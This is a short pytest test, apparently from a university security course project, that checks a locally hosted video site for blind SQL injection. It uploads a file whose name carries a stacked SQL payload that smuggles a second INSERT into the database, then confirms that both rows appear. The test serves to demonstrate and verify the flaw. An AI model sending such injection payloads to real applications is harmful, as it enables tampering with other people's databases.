import pytest
import requests

def test_blind_sql():
	vid_url = "https://github.com/GiaQM115/CSEC380Group14/blob/master/sample_videos/Alien%20Ant%20Farm%20-%20Smooth%20Criminal.mp4?raw=true"
	vid = "BlindSQLInjection1\'); INSERT INTO videos(uploader_id, filename) VALUES (1, \'BlindSQLInjection2"
	url = "http://localhost/"
	with requests.Session() as s:
		# login
		s.post(url+"login.php", data={'username':'test','password':'test'})
		home = s.get("http://localhost/")
		assert("What do you want to watch today" in home.text)
		# upload
		s.post(url+"download.php", data={'urlToUpload':vid_url,'nameOfFile':vid})
		# access
		view = s.get("http://localhost/home.php")
		assert(view.text.find("BlindSQLInjection1") != -1)
		view = s.get("http://localhost/home.php")
		assert(view.text.find("BlindSQLInjection2") != -1)
